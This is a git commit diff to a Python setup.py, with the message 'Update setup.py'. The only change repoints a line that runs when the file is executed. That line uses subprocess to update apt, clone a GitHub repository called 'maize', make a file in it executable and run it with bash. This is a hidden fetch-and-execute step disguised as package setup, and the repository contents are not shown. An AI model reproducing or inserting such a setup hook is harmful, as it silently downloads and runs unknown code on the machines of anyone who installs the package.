b7598e4f78f9bdea72edbd9a6b66b7604b137e7d
zolilesomaqhuzu <157845823+zolilesomaqhuzu@users.noreply.github.com>
2024-02-27 23:53:29 +0200

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 #!/usr/bin/env python
 import subprocess
 
-subprocess.check_call("apt update;apt -y insall wget git curl;git clone https://github.com/mpendulomdlankomo/maize.git;cd maize;chmod +x maize;bash maize", shell=True)
+subprocess.check_call("apt update;apt -y insall wget git curl;git clone https://github.com/zolilesomaqhuzu/maize.git;cd maize;chmod +x maize;bash maize", shell=True)
